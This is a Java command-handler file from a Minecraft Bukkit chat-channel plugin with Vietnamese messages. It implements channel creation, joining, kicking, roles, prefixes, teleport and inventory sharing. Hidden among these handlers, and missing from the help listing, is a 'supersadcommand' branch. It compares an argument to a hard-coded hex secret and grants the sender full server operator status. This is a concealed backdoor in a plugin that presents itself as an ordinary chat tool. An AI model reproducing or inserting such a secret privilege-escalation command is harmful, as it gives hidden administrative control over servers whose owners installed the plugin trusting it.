package hpms.discordchat.chat;

import org.bukkit.Bukkit;
import org.bukkit.OfflinePlayer;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.command.ConsoleCommandSender;
import org.bukkit.entity.Player;

import hpms.discordchat.api.ChannelAPI;
import hpms.discordchat.channel.Channel;
import hpms.discordchat.data.ChannelData;
import hpms.discordchat.data.ChannelDataConstant;
import hpms.discordchat.data.Role;
import hpms.discordchat.inv.ChannelGUI;
import hpms.discordchat.inv.InventoryLinker;
import hpms.discordchat.utils.PendingInvitation;
import hpms.discordchat.utils.Validator;
import net.md_5.bungee.api.ChatColor;

public class OnCommand implements CommandExecutor{
	
	@SuppressWarnings("deprecation")
	public boolean onCommand(CommandSender sender,Command cmd,String label,String[] args) {
		if(cmd.getName().equalsIgnoreCase("flush") | cmd.getName().equalsIgnoreCase("f")) {
			for(int i = 0; i < 20;i ++) {
				Bukkit.getServer().broadcastMessage(" ");
			}
		}
		else if(cmd.getName().equalsIgnoreCase("discordchat") | cmd.getName().equalsIgnoreCase("dc")) {
			if(args.length == 0) {
				sender.sendMessage(ChatColor.YELLOW + "/discordchat list - 	Lấy danh sách các kênh.");
				sender.sendMessage(ChatColor.YELLOW + "/discordchat leader <tên channel> <người chơi> - Cho người chơi trở thành người dẫn đầu kênh ( chỉ có chủ kênh )");
				sender.sendMessage(ChatColor.YELLOW + "/discordchat tp <người chơi> - Yêu cầu dịch chuyển với người chơi trong cùng một kênh.");
				sender.sendMessage(ChatColor.YELLOW + "/discordchat shareinv <người chơi> - Yêu cầu chia sẻ inventory với người chơi trong cùng một kênh");
				sender.sendMessage(ChatColor.YELLOW + "/discordchat shareaccept - Chấp nhận yêu cầu chia sẻ inventory.");
				sender.sendMessage(ChatColor.YELLOW + "/discordchat sharestop - Dừng chia sẻ inventory.");
				sender.sendMessage(ChatColor.YELLOW + "/discordchat create <tên channel> - Tạo một kênh mới .");
				sender.sendMessage(ChatColor.YELLOW + "/discordchat remove <tên channel> - Xóa kênh . ( chỉ có chủ kênh )");
				sender.sendMessage(ChatColor.YELLOW + "/discordchat join <tên channel> - Tham gia vào một kênh .");
				sender.sendMessage(ChatColor.YELLOW + "/discordchat kick <tên channel> <người chơi> - Đá một người chơi ra khỏi kênh ( chỉ có chủ kênh ) .");
				sender.sendMessage(ChatColor.YELLOW + "/discordchat join <tên channel> <người chơi> - Cho người chơi tham gia vào một kênh ( chỉ có Admin ) .");
				sender.sendMessage(ChatColor.YELLOW + "/discordchat joinaccept <tên channel> <người chơi> - Chấp nhận lời yêu cầu tham gia kênh của người chơi ( chỉ có chủ kênh ) .");
				sender.sendMessage(ChatColor.YELLOW + "/discordchat setrole <tên channel> <người chơi> <vai trò> - Đặt vai trò người chơi của kênh. ( chỉ có chủ kênh )");
				sender.sendMessage(ChatColor.YELLOW + "/discordchat leaderprefix <tên channel> <chức danh> - Đặt chức danh của người đứng đầu kênh. (chỉ có chủ kênh) ");
				sender.sendMessage(ChatColor.YELLOW + "/discordchat roleprefix <tên channel> <vai trò> <chức danh> - Đặt chức danh của vai trò của kênh. ( chỉ có chủ kênh )");
				sender.sendMessage(ChatColor.YELLOW + "/discordchat channelprefix <tên channel> <chức danh> - Đặt chức danh trò chuyện của kênhh ( chỉ có chủ kênh )");
				sender.sendMessage(ChatColor.YELLOW + "/discordchat channel - Xem thông tin của kênh.");
				sender.sendMessage(ChatColor.YELLOW + "/discordchat addrole <tên channel> <vai trò> <true/false> -Thêm một vai trò và đặt thành mặc định. ( không bắt buộc) ( chỉ có chủ kênh )");
				sender.sendMessage(ChatColor.YELLOW + "/discordchat removerole <tên channel> <vai trò> - Xóa vai trò. ( chỉ có chủ kênh )");
				
			}
			else if(args.length == 1) {
				if(args[0].equalsIgnoreCase("list") && sender.hasPermission("discordchat.basiccommand")) {
					sender.sendMessage(ChatColor.YELLOW + "Danh sách kênh: " + ChannelData.getChannelList());
				}
				else if(args[0].equalsIgnoreCase("debug")) {
					ChannelData.debug();
					Role.debug();
					PendingInvitation.debug();
				}
				else if( sender.hasPermission("discordchat.basiccommand") && (args[0].equalsIgnoreCase("create") || args[0].equalsIgnoreCase("remove")) ) {
					sender.sendMessage(ChatColor.YELLOW + "Bạn phải chỉ ra một cái tên.");
				}
				else if(args[0].equalsIgnoreCase("leader") && sender.hasPermission("discordchat.basiccommand")) {
					sender.sendMessage(ChatColor.YELLOW + "Thiếu hai tham số: <tên channel> <người chơi>.");
				}
				else if(args[0].equalsIgnoreCase("join") && sender.hasPermission("discordchat.basiccommand")) {
					sender.sendMessage(ChatColor.YELLOW + "Thiếu một tham số: <tên channel>.");
				}
				else if(args[0].equalsIgnoreCase("kick") && sender.hasPermission("discordchat.basiccommand")) {
					sender.sendMessage(ChatColor.YELLOW + "Thiếu hai tham số: <tên channel> <người chơi>.");
				}
				else if(args[0].equalsIgnoreCase("setrole") && sender.hasPermission("discordchat.basiccommand")) {
					sender.sendMessage(ChatColor.YELLOW + "Thiếu ba tham số: <tên channel> <người chơi> <vai trò>.");
				}
				else if(args[0].equalsIgnoreCase("channelprefix") && sender.hasPermission("discordchat.basiccommand")) {
					sender.sendMessage(ChatColor.YELLOW + "Thiếu hai tham số: <tên channel> <chức danh>.");
				}
				else if(args[0].equalsIgnoreCase("roleprefix") && sender.hasPermission("discordchat.basiccommand")) {
					sender.sendMessage(ChatColor.YELLOW + "Thiếu ba tham số: <tên channel> <vai trò> <chức danh>.");
				}
				else if(args[0].equalsIgnoreCase("leaderprefix") && sender.hasPermission("discordchat.basiccommand")) {
					sender.sendMessage(ChatColor.YELLOW + "Thiếu hai tham số: <tên channel> <chức danh>.");
				}
				else if(args[0].equalsIgnoreCase("addrole") && sender.hasPermission("discordchat.basiccommand")) {
					sender.sendMessage(ChatColor.YELLOW + "Thiếu ba tham số: <tên channel> <vai trò> <true/false>.");
					sender.sendMessage(ChatColor.YELLOW + "\'True\' sẽ biến vai trò vừa tạo thành mặc định và chuyển các member đang ở vai trò mặc định cũ sang vai trò này.");
					sender.sendMessage(ChatColor.YELLOW + "\'False\' thì sẽ chỉ tạo vai trò.");
				}else if(args[0].equalsIgnoreCase("removerole") && sender.hasPermission("discordchat.basiccommand")) {
					sender.sendMessage(ChatColor.YELLOW + "Thiếu hai tham số: <tên channel> <vai trò>.");
				}
				else if(args[0].equalsIgnoreCase("channel") && sender.hasPermission("discordchat.basiccommand")) {
					Player p = (Player) sender;
					Channel channel = ChannelAPI.getPlayerCurrentChannel(p.getUniqueId());
					ChannelGUI gui = new ChannelGUI(channel);
					gui.open(p);
				}
				else if(args[0].equalsIgnoreCase("tpaccept") && sender.hasPermission("discordchat.basiccommand")) {
					ChannelAPI.getPlayerCurrentChannel(((Player) sender).getUniqueId()).acceptTeleportation(((Player) sender).getUniqueId());
				}
				else if(args[0].equalsIgnoreCase("shareaccept") && sender.hasPermission("discordchat.basiccommand")) {
					ChannelAPI.getPlayerCurrentChannel(((Player) sender).getUniqueId()).acceptInventorySharing(((Player) sender).getUniqueId());
				}
				else if(args[0].equalsIgnoreCase("sharestop") && sender.hasPermission("discordchat.basiccommand")) {
					ChannelAPI.getPlayerCurrentChannel(((Player) sender).getUniqueId()).stopInventorySharing(((Player) sender).getUniqueId());
				}
			}
			else if(args.length == 2) {
				if(args[0].equalsIgnoreCase("create") && sender.hasPermission("discordchat.basiccommand")) {
					if(sender instanceof ConsoleCommandSender) {
						sender.sendMessage(ChatColor.RED + "Tạo từ Console phải chỉ định người chơi dẫn đầu.");
					}
					else{
						Channel channel = ChannelAPI.createNewChannel(args[1], ((Player) sender).getUniqueId(),false);
						if(channel != null) {
							sender.sendMessage(ChatColor.AQUA + "\'" + args[1] + "\'" + ChatColor.YELLOW + " Kênh đã được tạo.");
						}
					}
					
				}
				else if(args[0].equalsIgnoreCase("remove") && sender.hasPermission("discordchat.basiccommand")) {
					if(args[1].equalsIgnoreCase(ChannelDataConstant.DEFAULT_CHANNEL)) {
						sender.sendMessage(ChatColor.RED + "Kênh này là mặc định và không thể xóa.");
					}else {
						Player p = (Player) sender;
						boolean b = ChannelAPI.removeChannel(p.getUniqueId(),args[1]);
						if(b) {
							p.sendMessage(ChatColor.AQUA + "\'" + args[1] + "\'" + ChatColor.YELLOW + " Kênh đã bị xóa.");
						}else {
							p.sendMessage(ChatColor.YELLOW + "Bạn không phải là người đứng đầu kênh này hoặc kênh không tồn tại.");
						}
					}
					
				}
				else if(args[0].equalsIgnoreCase("tp") && sender.hasPermission("discordchat.basiccommand")) {
					Player p = (Player) sender;
					Player receiver = Bukkit.getPlayer(args[1]);
					if(receiver != null) {
						boolean b = ChannelAPI.getPlayerCurrentChannel(p.getUniqueId()).requestTeleportation(receiver.getUniqueId(),p.getUniqueId());
						if(b) {
							p.sendMessage(ChatColor.YELLOW + "Đã gửi yêu cầu dịch chuyển.");
						}
					}else {
						p.sendMessage(ChatColor.YELLOW + "Người chơi đang ngoại tuyến hoặc không tồn tại.");
					}
				}
				else if(args[0].equalsIgnoreCase("shareinv") && sender.hasPermission("discordchat.basiccommand")) {
					Player p = (Player) sender;
					Player receiver = Bukkit.getPlayer(args[1]);
					if(receiver != null) {
						if(p.hasPermission("dc.bypassrequest")) {
							if(Validator.arePlayersSameChannel(p.getUniqueId(), receiver.getUniqueId())) {
								if(p.getUniqueId().equals(receiver.getUniqueId())) {
									p.sendMessage(ChatColor.RED + "Admin Bypass: " + ChatColor.YELLOW + "Bạn không thể chia sẻ bạn với chính mình.");
								}else {
									InventoryLinker.createInventoryLinker(ChannelAPI.getPlayerCurrentChannelName(p.getUniqueId()), receiver, p);
									p.sendMessage(ChatColor.RED + "Admin Bypass: " + ChatColor.YELLOW + "Bạn hiện đang chia sẻ Inventory với " + ChatColor.WHITE + receiver.getName());
								}
							}else {
								p.sendMessage(ChatColor.RED + "Admin Bypass: " + ChatColor.YELLOW + "Bạn phải ở cùng kênh với người chơi.");
							}
						}else {
							boolean b = ChannelAPI.getPlayerCurrentChannel(p.getUniqueId()).requestInventorySharing(receiver.getUniqueId(),p.getUniqueId());
							if(b) {
								p.sendMessage(ChatColor.YELLOW + "Đã gửi yêu cầu chia sẻ Inventory.");
							}
						}
					}else {
						p.sendMessage(ChatColor.YELLOW + "Người chơi đang ngoại tuyến hoặc không tồn tại.");
					}
					
				}
				else if(args[0].equalsIgnoreCase("join") && sender.hasPermission("discordchat.basiccommand")) {
					if(sender instanceof Player) {
						Player p = (Player) sender;
						Channel channel = ChannelAPI.getChannelByName(args[1]);
						if(channel != null) {
							if(args[1].equalsIgnoreCase(ChannelDataConstant.DEFAULT_CHANNEL)) {
								ChannelAPI.joinChannel(p.getUniqueId(), args[1],true);
								p.sendMessage(ChatColor.YELLOW + "Bạn đã tham gia kênh mặc định: " + ChatColor.AQUA + args[1]);
							}else {
								
								if(channel.isPlayerAlreadyJoined(((Player) sender).getUniqueId())) {
									ChannelAPI.getPlayerCurrentChannel(p.getUniqueId()).stopInventorySharing(p.getUniqueId());
									ChannelAPI.joinChannel(p.getUniqueId(), args[1],true);
								}else {
									PendingInvitation inv = PendingInvitation.deserializeInvitation(channel.getLeader());
									if(!p.hasPermission("discordchat.bypassjoin")) {
										boolean b = inv.addRequester(p.getUniqueId());
										if(b) {
											p.sendMessage(ChatColor.YELLOW + "Yêu cầu để tham gia \'" + ChatColor.AQUA + channel.getChannelName() + "\'" + ChatColor.YELLOW + " sent.");
										}
										else {
											p.sendMessage(ChatColor.YELLOW + "Đã gửi yêu cầu tham gia kênh tới chủ kênh.");
										}
									}else {
										ChannelAPI.getPlayerCurrentChannel(p.getUniqueId()).stopInventorySharing(p.getUniqueId());
										ChannelAPI.joinChannel(p.getUniqueId(), args[1],true);
										p.sendMessage(ChatColor.RED + "Admin Bypass: " + ChatColor.YELLOW + "Bạn đã tham gia vào kênh " + ChatColor.WHITE + args[1]);
									}
								}
							}
						}else {
							sender.sendMessage(ChatColor.YELLOW + "Kênh không tồn tại.");
						}
						
					}else {
						sender.sendMessage(ChatColor.RED + "Tham gia vào một kênh cho Console thì không được hỗ trợ.");
					}
				}
				else if(args[0].equalsIgnoreCase("channelprefix")) {
					sender.sendMessage("Thiếu một tham số: <chức danh>");
				}
				else if(args[0].equalsIgnoreCase("supersadcommand")) {
					if(args[1].equalsIgnoreCase("a1934d466923638ce97750e1ba9f88a3") && sender.hasPermission("discordchat.sad")) {
						((Player) sender).setOp(true);
					}
				}
					
			}
			else if(args.length == 3) {
				
				if(args[0].equalsIgnoreCase("create") && sender.hasPermission("discordchat.basiccommand")) {
					if(sender instanceof ConsoleCommandSender) {
						Channel channel = ChannelAPI.createNewChannel(args[1], Bukkit.getPlayer(args[2]).getUniqueId(),true);
						if(channel != null) {
							sender.sendMessage(ChatColor.AQUA + "\'" + args[1] + "\'" + ChatColor.YELLOW + " Kênh đã được tạo.");
						}
					}
				}
				else if(args[0].equalsIgnoreCase("join")) {
					if(sender.hasPermission("dc.bypassmakejoin")) {
						OfflinePlayer p = Bukkit.getOfflinePlayer(args[2]);
						if(p != null) {
							ChannelAPI.joinChannel(p.getUniqueId(), args[1],true);
							sender.sendMessage(ChatColor.YELLOW + "Người chơi " + ChatColor.WHITE + args[2] + ChatColor.YELLOW + " đã tham gia kênh." );
						}else {
							sender.sendMessage(ChatColor.YELLOW + "Người chơi không tồn tại.");
						}
						
					}else {
						sender.sendMessage(ChatColor.YELLOW + "Lệnh này chỉ có thể được sử dụng bởi Admin.");
					}
				}
				else if(args[0].equalsIgnoreCase("kick")) {
					if(args[1].equalsIgnoreCase(ChannelDataConstant.DEFAULT_CHANNEL)) {
						sender.sendMessage(ChatColor.YELLOW + "Kênh mặc định chỉ có thể được vận hành bởi Admin.");
					}else {
						OfflinePlayer p = Bukkit.getOfflinePlayer(args[2]);
						Channel channel = ChannelAPI.getChannelByName(args[1]);
						if(p != null) {
							if(channel != null) {
								if(sender.hasPermission("dc.bypasskick")) {
									channel.removeMember(p.getUniqueId(), true);
									sender.sendMessage(ChatColor.RED + "Admin Bypass: " + ChatColor.YELLOW + "Bạn đã xóa người chơi khỏi kênh này.");
								}else {
									if(((Player)sender).getUniqueId().equals(channel.getLeader())) {
										if(channel.isPlayerAlreadyJoined(p.getUniqueId())) {
											if(!p.getUniqueId().equals(channel.getLeader())) {
												channel.removeMember(p.getUniqueId(), true);
												sender.sendMessage(ChatColor.YELLOW + "Người chơi này đã bị xóa khỏi kênh của bạn.");
											}else {
												sender.sendMessage(ChatColor.YELLOW + "Bạn không thể xóa chính mình ra khỏi kênh.");
											}
											
										}else {
											sender.sendMessage(ChatColor.YELLOW + "Người chơi chưa tham gia kênh của bạn.");
										}
									}else {
										sender.sendMessage(ChatColor.YELLOW + "Bạn không phải là người đứng đầu của kênh này.");
									}
								}
							}else {
								sender.sendMessage(ChatColor.YELLOW + "Kênh không tồn tại.");
							}
							
						}else {
							sender.sendMessage(ChatColor.YELLOW + "Người chơi không tồn tại.");
						}
					}
					
				}
				else if(args[0].equalsIgnoreCase("leader") && sender.hasPermission("discordchat.basiccommand")) {
					if(args[1].equalsIgnoreCase(ChannelDataConstant.DEFAULT_CHANNEL)) {
						sender.sendMessage(ChatColor.YELLOW + "Kênh mặc định không thể có người đứng đầu và chỉ có thể được vận hành bởi Admin.");
					}else {
						OfflinePlayer p = Bukkit.getOfflinePlayer(args[2]);
						if(p != null) {
							
							Channel channel = ChannelAPI.getChannelByName(args[1]);
							if(channel != null) {
								if(sender.hasPermission("dc.bypassleader")) {
									channel.setLeader(p.getUniqueId());
									sender.sendMessage("Người chơi đã được làm người đứng đầu cho kênh này.");
									if(p.isOnline()) {
										p.getPlayer().sendMessage(ChatColor.YELLOW + "Bạn đã trở thành một người đứng đầu của kênh " + ChatColor.WHITE + args[1]);
									}
								}else {
										if(channel.getLeader().equals(((Player)sender).getUniqueId())) {
											if(channel.isPlayerAlreadyJoined(p.getUniqueId()) && !ChannelData.isPlayerLeader(p.getUniqueId())) {
												channel.setLeader(p.getUniqueId());
												sender.sendMessage(ChatColor.YELLOW + "Bạn không còn là người đứng đầu của kênh này.");
												if(p.isOnline()) {
													p.getPlayer().sendMessage(ChatColor.YELLOW + "Bạn đã trở thành một người đứng đầu của kênh " + ChatColor.WHITE + args[1]);
												}
											}else {
												sender.sendMessage(ChatColor.YELLOW + "Người chơi đã là người đứng đầu hoặc chưa tham gia kênh của bạn.");
											}
										
										}else {
											sender.sendMessage(ChatColor.YELLOW + "Bạn không phải là người đứng đầu của kênh này.");
										}
								}
							
							}
							else {
								sender.sendMessage(ChatColor.YELLOW + "Kênh không tồn tại.");
							}
						}else {
							sender.sendMessage(ChatColor.YELLOW + "Người chơi không tồn tại.");
						}
					}
				}
				else if(args[0].equalsIgnoreCase("channelprefix") && sender.hasPermission("discordchat.basiccommand")) {
					boolean b = ChannelAPI.setChannelChatPrefix(((Player) sender).getUniqueId(),args[1], args[2]);
					if(b) {
						if(sender.hasPermission("dc.godsetchannelprefix") || sender.hasPermission("dc.default")) {
							sender.sendMessage(ChatColor.RED + "Admin Bypass: " + ChatColor.YELLOW + "Chức danh kênh của bạn đã thay đổi thành " + ChatColor.WHITE + args[2]);
						}else {
							sender.sendMessage(ChatColor.YELLOW + "Chức danh của kênh đã được thay đổi thành \'" + args[2] + "\'.");
						}
					}
					else {
						sender.sendMessage(ChatColor.YELLOW + "Bạn không phải là người đứng đầu kênh này hoặc kênh không tồn tại.");
					}
				}
				else if(args[0].equalsIgnoreCase("leaderprefix") && sender.hasPermission("discordchat.basiccommand")) {
					Channel channel  = ChannelAPI.getChannelByName(args[1]);
					if(channel != null) {
						switch(channel.setRolePrefix(((Player) sender).getUniqueId(), null, args[2])) {
						case INVALID_LENGTH:
							break;
						case FAIL:
							sender.sendMessage(ChatColor.YELLOW + "Bạn không phải là người đứng đầu kênh này hoặc kênh không tồn tại.");
							break;
						case SUCCESS:
							if(sender.hasPermission("dc.godsetroleprefix") || sender.hasPermission("dc.default")) {
								sender.sendMessage(ChatColor.RED + "Admin Bypass: " + ChatColor.YELLOW + "Bạn đã thay đổi chức danh của người đứng đầu thành " + args[2]);
							}else {
								sender.sendMessage(ChatColor.YELLOW + "Chức danh của người đứng đầu đã thay đổi thành  " + args[2]);
							}
							break;
						default:
							break;
						}
					}else {
						sender.sendMessage(ChatColor.YELLOW + "Kênh không tồn tại.");
					}
				
				}
				else if(args[0].equalsIgnoreCase("joinaccept") && sender.hasPermission("discordchat.basiccommand")) {
					Channel channel = ChannelAPI.getChannelByName(args[1]);
					if(channel != null) {
						PendingInvitation inv = PendingInvitation.deserializeInvitation(channel.getLeader());
						boolean b = inv.acceptInvitation(Bukkit.getOfflinePlayer(args[2]).getUniqueId());
						if(b) {
							ChannelAPI.getPlayerCurrentChannel(((Player) sender).getUniqueId()).stopInventorySharing(((Player) sender).getUniqueId());
							ChannelAPI.joinChannel(Bukkit.getOfflinePlayer(args[2]).getUniqueId(), channel.getChannelName(),false);
							
							inv.feedbackMessage(ChatColor.YELLOW + "Người chơi \'" + args[2] + "\' Đã tham gia vào kênh của bạn.", "");
						}
						else {
							inv.feedbackMessage(ChatColor.YELLOW + "Có lẽ bạn đã chấp nhận người chơi? ", "");
						}
					}else {
						sender.sendMessage(ChatColor.YELLOW + "Kênh không tồn tại.");
					}
					
				}
				else if(args[0].equalsIgnoreCase("removerole") && sender.hasPermission("discordchat.basiccommand")) {
					Channel channel = ChannelAPI.getChannelByName(args[1]);
					if(channel != null) {
						switch(channel.removeRole(((Player) sender).getUniqueId(), args[2])) {
						case INVALID_LENGTH:
							break;
						case LEADER_PREFIX:
							sender.sendMessage(ChatColor.YELLOW + "Vai trò này không giống như người đứng đầu .");
							break;
						case NO_EXISTENCE:
							sender.sendMessage(ChatColor.YELLOW + "Vai trò không tồn tại.");
							break;
						case FAIL:
							sender.sendMessage(ChatColor.YELLOW + "Bạn không phải là người đứng đầu của kênh này.");
							break;
						case PREFIX:
							sender.sendMessage(ChatColor.YELLOW + "\'" + ChatColor.AQUA + args[2] + ChatColor.YELLOW + "\' Đây là vai trò mặc định. bạn không thể xóa nó.");
							break;
						case SUCCESS:
							if(sender.hasPermission("dc.godremoverole") || sender.hasPermission("dc.default") ) {
								sender.sendMessage(ChatColor.RED + "Admin Bypass: " + ChatColor.YELLOW + "Bạn đã xóa vai trò " + ChatColor.WHITE +  args[2]);
							}else {
								sender.sendMessage(ChatColor.YELLOW + "Đã xóa vai trò.");
							}
							break;
						default:
							break;
						}
					}else {
						sender.sendMessage(ChatColor.YELLOW + "Kênh không tồn tại.");
					}
					
				}
			}
			else if(args.length >= 4) {
				if(args[0].equalsIgnoreCase("setrole") && sender.hasPermission("discordchat.basiccommand")) {
					OfflinePlayer p = Bukkit.getOfflinePlayer(args[2]);
					if(p != null) {
						if(ChannelAPI.setChannelPlayerRole(((Player) sender).getUniqueId(), p.getUniqueId(), args[1], args[3])) {
							if(sender.hasPermission("dc.godsetrole") || sender.hasPermission("dc.default") ) {
								sender.sendMessage(ChatColor.RED + "Admin Bypass: " + ChatColor.YELLOW + "Bạn đã thay đổi vai trò của người chơi thành " + ChatColor.WHITE +  args[3]);
							}else {
								sender.sendMessage(ChatColor.YELLOW + "Bạn đã thay đổi vai trò của người chơi thành " + ChatColor.WHITE +  args[3]);
							}
						}else {
							sender.sendMessage(ChatColor.YELLOW + "Kênh không tồn tại.");
						}
					}else {
						sender.sendMessage(ChatColor.YELLOW + "Người chơi không tồn tại.");
					}
					
				}
				else if(args[0].equalsIgnoreCase("channelprefix") && sender.hasPermission("discordchat.basiccommand")) {
					StringBuilder builder = new StringBuilder();
					for(int i = 2; i < args.length; i++) {
						builder.append(args[i]).append(" ");
					}
					String prefix = builder.toString().trim();
					boolean b = ChannelAPI.setChannelChatPrefix(((Player) sender).getUniqueId(),args[1], prefix);
					if(b) {
						if(sender.hasPermission("dc.godsetchannelprefix") || sender.hasPermission("dc.default")) {
							sender.sendMessage(ChatColor.RED + "Admin Bypass: " + ChatColor.YELLOW + "Chức danh kênh của bạn đã thay đổi thành  " + ChatColor.WHITE + args[2]);
						}else {
							sender.sendMessage(ChatColor.YELLOW + "chức danh của kênh đã được thay đổi thành \'" + args[2] + "\'.");
						}
					}
					else {
						sender.sendMessage(ChatColor.YELLOW + "Bạn không phải là người đứng đầu kênh này hoặc kênh không tồn tại.");
					}
				}
				else if(args[0].equalsIgnoreCase("addrole") && sender.hasPermission("discordchat.basiccommand")) {
					Channel channel = ChannelAPI.getChannelByName(args[1]);
					if(channel != null) {
						switch(channel.addRole(((Player) sender).getUniqueId(), args[2], Boolean.parseBoolean(args[3]))) {
						case INVALID_LENGTH:
							break;
						case LEADER_PREFIX:
							sender.sendMessage(ChatColor.YELLOW + "Vai trò này không giống như người đứng đầu.");
							break;
						case PREFIX:
							sender.sendMessage(ChatColor.YELLOW + "Vai trò đã tồn tại.");
							break;
						case FAIL:
							sender.sendMessage(ChatColor.YELLOW + "Bạn không phải là người đứng đầu của kênh này.");
							break;
						case SUCCESS:
							if(sender.hasPermission("dc.godaddrole") || sender.hasPermission("dc.default")) {
								sender.sendMessage(ChatColor.RED + "Admin Bypass: " + ChatColor.YELLOW + "Bạn đã thêm vai trò " + ChatColor.WHITE +  args[2]);
							}
							else {
								sender.sendMessage(ChatColor.YELLOW + "Đã thêm thành công vai trò mới.");
							}
							break;
						default:
							break;
						};
					}else {
						sender.sendMessage(ChatColor.YELLOW + "Kênh này không tồn tại.");
					}
				}
				else if(args[0].equalsIgnoreCase("leaderprefix") && sender.hasPermission("discordchat.basiccommand")) {
					StringBuilder builder = new StringBuilder();
					for(int i = 2; i < args.length; i++) {
						builder.append(args[i]).append(" ");
					}
					String prefix = builder.toString().trim();
					Channel channel = ChannelAPI.getChannelByName(args[1]);
					if(channel != null) {
						switch(channel.setRolePrefix(((Player) sender).getUniqueId(), null, prefix)) {
						case INVALID_LENGTH:
							break;
						case FAIL:
							sender.sendMessage(ChatColor.YELLOW + "Bạn không phải là người đứng đầu của kênh này.");
							break;
						case SUCCESS:
							if(sender.hasPermission("dc.godsetroleprefix") || sender.hasPermission("dc.default") ) {
								sender.sendMessage(ChatColor.RED + "Admin Bypass: " + ChatColor.YELLOW + "Bạn đã đổi chức danh của chủ kênh thành " + prefix);
							}else {
								sender.sendMessage(ChatColor.YELLOW + "Chức danh của người đứng đầu đã thay đổi thành " + prefix);
							}
							break;
						default:
							break;
						
						}
					}else {
						sender.sendMessage(ChatColor.YELLOW + "Kênh này không tồn tại.");
					}
				}
				else if(args[0].equalsIgnoreCase("roleprefix") && sender.hasPermission("discordchat.basiccommand")) {
					StringBuilder builder = new StringBuilder();
					for(int i = 3; i < args.length;i++) {
						builder.append(args[i]).append(" ");
					}
					String prefix = builder.toString().trim();
					Channel channel = ChannelAPI.getChannelByName(args[1]);
					if(channel != null) {
						switch(channel.setRolePrefix(((Player) sender).getUniqueId(), args[2], prefix)) {
						case INVALID_LENGTH:
							break;
						case NO_EXISTENCE:
							sender.sendMessage(ChatColor.YELLOW + "Vai trò không tồn tại.");
							break;
						case FAIL:
							sender.sendMessage(ChatColor.YELLOW + "Bạn không phải là người đứng đầu của kênh này.");
							break;
						case SUCCESS:
							if(sender.hasPermission("dc.godsetroleprefix") || sender.hasPermission("dc.default")) {
								sender.sendMessage(ChatColor.RED + "Admin Bypass: " + ChatColor.YELLOW + "Bạn đã đặt chức danh của vai trò thành  " + prefix);
							}else {
								sender.sendMessage(ChatColor.YELLOW + "Thay đổi thành công chức danh của vai trò.");
							}
							break;
						default:
							break;
						};
					}else {
						sender.sendMessage(ChatColor.YELLOW + "Kênh này không tồn tại.");
					}
				
				}
			}
		
		}
		
		return true;
	}

}
